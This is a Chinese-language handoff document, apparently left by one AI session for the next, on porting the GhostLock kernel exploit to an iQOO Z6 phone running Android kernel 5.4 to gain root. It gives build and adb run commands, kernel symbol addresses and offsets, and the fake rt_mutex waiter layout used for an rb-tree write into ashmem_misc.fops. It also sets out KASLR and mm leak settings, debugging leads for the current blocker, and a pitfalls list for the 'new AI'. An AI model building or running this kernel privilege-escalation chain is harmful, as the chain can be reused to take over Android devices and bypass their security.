# GhostLock 5.4 交接文档 — iQOO Z6 (PD2220A) 临时 root

> 更新: 2026-09-24 | 前序 AI 会话产出 | 详细技术分析见 analysis/GHOSTLOCK-5.4-PORT.md

## 1. 目标与当前状态

**目标**: iQOO Z6 (PD2220A, SM7325, Android 14, kernel 5.4.281-qgki, BL locked, uid=2000 shell) 获取临时 root。

**方法**: NebuSec GhostLock (CVE-2026-43499) exploit 的 5.4 移植。原始 6.x exploit 在 `cm/`, 5.4 移植在 `cm54/`。

**当前进度**:
```
KASLR 泄漏 ──✓── KS mm 泄漏 ──✓── SLUB 喷射 ──✓── pselect ghost 触发 ──✓──
consumer sched_setattr ──✓── ghost rb 写 → ashmem_misc.fops ──✗ 当前卡点 ──
CFI 任意 R/W (代码已就绪) ── root cred patch (代码已就绪) ── KernelSU
```

**唯一卡点**: ghost rb 树写未触发 (cfi step4: pre_rb=0)。所有下游代码已就绪。

## 2. 设备连接与基本操作

```bash
# 设备序列号
set DEVICE=<DEVICE_SERIAL>

# 检查连接 (USB 经常波动, 断连后等 30-60s 自动恢复)
adb devices

# 推送文件 (每次重启后 kill_tests.sh 会清掉测试文件, 需重推)
adb -s %DEVICE% push cm54\build\preload.so /data/local/tmp/preload.so
adb -s %DEVICE% push cm54\build\ks_test3 /data/local/tmp/ks_test3
adb -s %DEVICE% push cm54\build\glhost /data/local/tmp/glhost
adb -s %DEVICE% shell "chmod 755 /data/local/tmp/ks_test3 /data/local/tmp/glhost"

# 长时间测试必须 setsid 脱离 (USB 断连不会杀死进程)
adb -s %DEVICE% shell "setsid sh -c '命令 > /data/local/tmp/日志名.log 2>&1' < /dev/null &"

# 清理残留 (注意: kill_tests.sh 会删除测试文件!)
adb -s %DEVICE% shell "sh /data/local/tmp/kill_tests.sh"
# 手动杀进程
adb -s %DEVICE% shell "pkill -9 glhost; pkill -9 ks_test3"
```

**PowerShell 注意**: `&&` 和 `||` 不可用, 用 `;` 分隔。`$()` 变量替换会报错, 避免在 adb shell 里用。

## 3. 编译

### preload.so (exploit 主体, LD_PRELOAD 注入)
```bash
python build_cm54.py
# 产物: cm54/build/preload.so (~127KB)
```

### gl_standalone (exploit 独立可执行, 调试用)
```bash
python build_gl_standalone.py
# 产物: cm54/build/gl_standalone
# 需要 cm54/glmain.c (main wrapper) + cm54/glhost.c (LD_PRELOAD 宿主)
```

### ks_test3 (KernelSnitch 独立测试)
```bash
# NDK clang 手动编译 (PowerShell python -c 内嵌):
python -c "
import subprocess, os
NDK = r'J:\Users\Administrator\AppData\Local\Android\Sdk\ndk\27.3.13750724\toolchains\llvm\prebuilt\windows-x86_64\bin'
CLANG = os.path.join(NDK, 'aarch64-linux-android35-clang.cmd')
WORK = r'g:\项目\Windows管理\usb\临时root\cm54'
r = subprocess.run([CLANG, '-O2', '-static', '-pthread', '-D__ARM',
    '-I'+WORK, '-Wno-unused-parameter', '-Wno-sign-compare', '-Wno-unused-function',
    os.path.join(WORK,'ks_test.c'), '-o', os.path.join(WORK,'build','ks_test3')],
    capture_output=True, text=True, cwd=WORK)
print(r.stderr[-500:], r.returncode)
"
```

**编译关键 flag**: `-D__ARM` 必须 (否则 rdtsc x86 头文件报错)。target.h 通过 `-I` + `#include "../pd2220-5.4.281/target.h"` 链入。

## 4. 运行 exploit

```bash
# 真实 exploit (ghost rb 写模式):
adb shell "setsid sh -c 'LD_PRELOAD=/data/local/tmp/preload.so /data/local/tmp/glhost > /data/local/tmp/glRUN.log 2>&1' < /dev/null &"

# 调试模式 (KS 只测, 跳过 KASLR + fork army):
adb shell "setsid sh -c 'GL_SKIP_SLIDE=1 GL_KS_ONLY=1 GL_BENIGN=1 LD_PRELOAD=...' < /dev/null &"

# 查看结果:
adb shell "tail -30 /data/local/tmp/glRUN.log"
# 或等完整跑完后:
adb shell "grep -aE 'ks post|cfi|route|Write|summary|root|uid=' /data/local/tmp/glRUN.log"
```

**环境变量**:
| 变量 | 作用 |
|------|------|
| GL_BENIGN=1 | ghost rb 写改为安全目标 (验证机制, 不写 ashmem_misc.fops) |
| GL_SKIP_SLIDE=1 | 跳过 perf KASLR 泄漏 (省 ~7s, KS 不依赖 KASLR) |
| GL_KS_ONLY=1 | 跳过 fork army (调试用, 完整 exploit 不能开 — post-KS 引用未初始化 ctx) |

**成功标志** (看日志):
```
[+] slide-kaslr-ok ... base=ffffffXX...
[-] ks child output NNNN bytes, result mm=ffffff...   ← KS 命中 (非 ffffffff)
[-] ks post: leaked=... base=...
[-] ks post: skb payload ok
[*] consumer sched tid=... ret=0 errno=0              ← consumer 成功
[*] pselect returned attempt=1 ret=NN calls=1 success=1
[*] pselect cfi miss ... step=4                        ← 当前卡在这
# step=0 = CFI 成功! 之后看 install_child_root / uid=0
```

## 5. KernelSnitch 独立测试 (验证 KS 是否正常)

```bash
# 基本测试 (静默系统必须! reboot 后 load<2 再跑):
adb shell "setsid sh -c '/data/local/tmp/ks_test3 0x40 3 4 > /data/local/tmp/kst.log 2>&1' < /dev/null &"

# 等约 2-5 分钟 (全 VA 空间扫描), 查结果:
adb shell "grep 'RESULT' /data/local/tmp/kst.log"
# RESULT mm=ffffffXXXX  = 命中
# RESULT mm=ffffffffffffffff  = MISS
```

**KS 成功的条件** (缺一不可):
- 系统静默 (reboot 后 load < 2)
- ks_test3 是 static binary (dynamic PIE 有未验证差异)
- 每次 push 新 binary (kill_tests.sh 会删)

**KS 的 5 个关键参数** (已写入 pd2220-5.4.281/target.h):
| 参数 | 值 | 原因 |
|------|-----|------|
| 扫描步长 | 0x40 | SLUB 对齐下限; 0x840 会漏 mm |
| 扫描范围 | [0xffffff8000000000, 0xfffffffffffffff8] | 全内核 VA; mm 可能在 VA_START+63GB+ |
| 时钟 | CLOCK_MONOTONIC | cntvct_el0 有 0-tick 伪影 |
| 匹配 | matches >= KS_MIN_MATCHES(8) | 绝对阈值, 免疫外来碰撞 |
| 数组 | kernelsnitch_last_addrs[64] | [16] 越界写破坏 ks 指针 |

## 6. 当前卡点详细分析: ghost rb 写未触发

### 现象
exploit 跑到 `try_cfi_stage()` → `cfi step4: pre_rb=0 pre_fops=0`。
含义: `configfs_read_once(fd, &ashmem_misc.fops, ...)` 返回 0 字节,
即 **ashmem_misc.fops 没被改写** (如果 ghost 写成功了, fd 的 lseek+read
会返回 fake_fops 值)。

### ghost 写的预期机制
```
1. waiter 线程: futex_wait_requeue_pi(f_wait → f_pi_target)
   → SIGUSR1(0.8s) → ERESTART_RESTARTBLOCK → restart 深度
   → 主线程: FUTEX_CMP_REQUEUE_PI(1.2s) → ghost waiter 留在 rb tree
2. waiter 线程: 进入 pselect (fd_set 在栈上, 与 ghost waiter 重叠)
3. consumer 线程: sched_setattr(waiter_tid, nice=19) → prio 120→139
   → 内核 rt_mutex_adjust_prio → 遍历 waiter 的 PI waiters rb tree
   → 找到 ghost waiter (fake prio=119 < 139) → rb_erase(ghost)
   → rb_erase 跟随 fake ptr → 写 &ashmem_misc.fops = fake_fops
```

### 4 个候选原因 (按排查优先级)

**① requeue_pi 后 ghost 不在 rb tree** — 反汇编 `futex_requeue()` + `fixup_pi_state()`
确认 5.4 是否与 6.x 一样在 requeue 后留下 stale waiter。工具: llvm-objdump + vmlinux.elf
```powershell
& "J:\...\llvm-objdump.exe" -d --start-address=0xffffffc0103e7ba8 --stop-address=0xffffffc0103e8000 vmlinux.elf
# futex_reboot 符号: analysis/vmlinux_symbols.txt 行 95760
```

**② fake ptr word 映射偏差** — fd_set 全局 word3-12 → waiter struct 偏移:
```
waiter+0x00 tree.__rb_parent_color → in w3  (fake_w0)
waiter+0x08 tree.rb_right          → in w4  (fake_w0)
waiter+0x10 tree.rb_left           → out w0 (0)
waiter+0x18 pi.__rb_parent_color   → out w1 (fake_fops 或 benign=1)
waiter+0x20 pi.rb_right            → out w2 (&ashmem_misc.fops 或 benign=0)
waiter+0x28 pi.rb_left             → out w3 (0)
waiter+0x30 task                   → out w4 (INIT_TASK)
waiter+0x38 lock                   → ex w0  (fake_lock)
waiter+0x40 prio                   → ex w1  (119)
waiter+0x48 deadline               → ex w2  (0)
```
需验证: 5.4 rt_mutex_waiter 的 rb_node 是 tree(0x00) 还是 pi_tree(0x18)?
fd_set 的 3 个 set (in/out/ex) 在内核栈上的排列顺序 (5.4 core_sys_select)?

**③ pselect 提前返回** — ret=78-90 (fd ready) 而非 timeout=0。
ghost 数据被内核当作 ready fd → pselect 提前返回 → ghost 栈帧可能被
后续 syscall 覆盖。考虑增大 NFDS 或减少 fd bits。

**④ sched_setattr 不触发 ghost 的 rb_erase** — ghost->task = INIT_TASK
(fake), 内核 prio 调整可能不关联 fake task。需要检查 5.4 的
rt_mutex_adjust_prio 是否遍历 pi_tree 的 ALL waiters 还是只遍历 task 自身的。

## 7. 关键文件索引

| 文件 | 内容 |
|------|------|
| `cm54/kernelsnitch/kernelsnitch.h` | KS 核心算法 (测量+碰撞+bruteforce) |
| `cm54/kernelsnitch/futex_hash.h` | 用户态 futex hash (jhash2 复刻) |
| `cm54/kernelsnitch/utils.h` | 工具函数 (SYSCHK, pin_to_core, set_limit) |
| `cm54/util.c` | exploit 编排: prepare_kernel_page, clone_leak_child (exec KS) |
| `cm54/main.c` | run_exploit 入口 + waiter/owner/consumer 线程 |
| `cm54/fops.c` | pselect route + CFI stage (try_cfi_stage) |
| `cm54/slide.c` | perf KASLR 泄漏 |
| `cm54/pipe.c` | pipe buffer 页喷射 (post-KS) |
| `cm54/root.c` | cred 补丁 (需要 CFI R/W) |
| `cm54/target.h` → `pd2220-5.4.281/target.h` | 全部内核偏移 + KS 参数 |
| `pd2220-5.4.281/target.h` | 设备专属 target.h (所有 #define) |
| `analysis/GHOSTLOCK-5.4-PORT.md` | 完整技术分析 (偏移标定+机制) |
| `analysis/vmlinux_symbols.txt` | 内核符号表 (kallsyms 运行时地址) |
| `vmlinux.elf` | 内核 ELF (可反汇编, 配合 llvm-objdump) |
| `cm/` | 原始 6.x exploit (参考) |
| `cm54/ks_test.c` | KS 独立测试入口 |
| `cm54/ks_fork_test.c` | KS fork 上下文测试 |
| `cm54/build/` | 编译产物 |

## 8. 反汇编工具

```powershell
# llvm-objdump (NDK 自带):
$OBJDUMP = "J:\Users\Administrator\AppData\Local\Android\Sdk\ndk\27.3.13750724\toolchains\llvm\prebuilt\windows-x86_64\bin\llvm-objdump.exe"
& $OBJDUMP -d --start-address=0xSTART --stop-address=0xEND "g:\项目\Windows管理\usb\临时root\vmlinux.elf"

# 关键内核符号地址 (pre-KASLR, 静态):
# futex_wake:      0xffffffc0103e71bc
# futex_requeue:   0xffffffc0103e7ba8
# get_futex_key:   0xffffffc0103ee6dc
# futex_init:      0xffffffc0123e97c0
# init_task:       0xffffffc01292e200
# init_mm:         0xffffffc0129a6ad8
# 完整表: analysis/vmlinux_symbols.txt
```

## 9. 陷阱清单 (新 AI 必读)

1. **不要用 cntvct_el0 做时序** — 有 0-tick 伪影, 必须 CLOCK_MONOTONIC
2. **不要假设 mm 在 0x840 网格上** — 必须 0x40 步长全 VA 扫描
3. **不要用 relative misses 判据** — 外来碰撞数量不可控, 用绝对 KS_MIN_MATCHES
4. **ks_test3 必须 static 编译** — dynamic PIE 有未验证差异 (可能 MISS)
5. **kill_tests.sh 删测试文件** — 每次重启后重推
6. **长测试用 setsid** — USB 断连不会杀进程
7. **exploit 的 KS child 用 exec** — fork/inherit 都 MISS, 只有 exec 才命中
8. **post-KS 代码不能引用 ks 指针** (setup 在 child 里, parent 的 ks=NULL)
9. **vmlinux.elf 地址 = 运行时 kallsyms 地址** — 不是编译时地址
10. **设备 nproc 波动** (6/7/8) — CPU 热插拔, sysconf 返回值不稳定

## 10. 快速验证流程 (新 AI 上手第一步)

```bash
# 1. 确认设备连接
adb devices

# 2. 推送编译产物
adb push cm54\build\preload.so /data/local/tmp/preload.so
adb push cm54\build\ks_test3 /data/local/tmp/ks_test3
adb push cm54\build\glhost /data/local/tmp/glhost
adb shell "chmod 755 /data/local/tmp/*"

# 3. 跑 standalone KS 验证 (~3-5min):
adb shell "setsid sh -c '/data/local/tmp/ks_test3 0x40 3 4 > /data/local/tmp/kst.log 2>&1' < /dev/null &"
# 等 3 分钟后:
adb shell "grep RESULT /data/local/tmp/kst.log"
# 期望: RESULT mm=ffffffXXXX (非 ff..ff)

# 4. 跑 exploit (benign 验证):
adb shell "setsid sh -c 'GL_BENIGN=1 LD_PRELOAD=/data/local/tmp/preload.so /data/local/tmp/glhost > /data/local/tmp/gl.log 2>&1' < /dev/null &"
# 等 3 分钟后:
adb shell "grep -aE 'ks child|ks post|consumer|cfi|route' /data/local/tmp/gl.log"
# 期望: ks result mm=非ffff, consumer success=1, cfi step=4 (benign 正常)

# 5. 跑 exploit (真实模式):
adb shell "setsid sh -c 'LD_PRELOAD=/data/local/tmp/preload.so /data/local/tmp/glhost > /data/local/tmp/glR.log 2>&1' < /dev/null &"
# 监控:
adb shell "grep -aE 'cfi|Write|root|uid=' /data/local/tmp/glR.log"
# 期望: cfi write ret=35, cfi read ret=35, install_child_root, uid=0
```
